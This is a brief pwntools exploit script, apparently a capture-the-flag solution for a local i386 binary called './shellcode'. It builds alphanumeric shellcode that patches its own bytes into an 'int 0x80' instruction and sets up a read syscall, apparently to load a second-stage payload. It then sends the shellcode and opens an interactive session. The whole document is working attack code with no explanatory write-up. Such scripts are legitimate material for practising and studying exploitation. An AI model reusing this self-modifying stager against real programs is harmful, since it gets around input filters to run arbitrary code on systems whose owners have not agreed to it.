#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
p = process('./shellcode')
info(disasm(unhex('cd80')))
info(hex(0xff ^ 0xcd))
info(hex(0xff ^ 0x80))
# gdb.attach(p)
sh = (
	'LLLLY' + # ecx = buffer addr
	'jDX4AH' + # eax = -1
	'0A0' + # make 0xcd = 0xff ^ '2'
	'jDX4AH' + # eax = -1
	'49' + # eax ^= '9'
	'0A1' + # make 0x80 = 0xff ^ '9' ^ 'F'
	'jAX4A' + # eax = 0
	'PQPPPPPPa' + # ebx = 0
	'jzZ' + # edx = 'z'
	'j7X44' # eax = 3
).ljust(48, 'P') + '2F'
info(disasm(sh))
info(len(sh))
p.sendline(sh.ljust(0x100, '\x00'))
p.interactive()
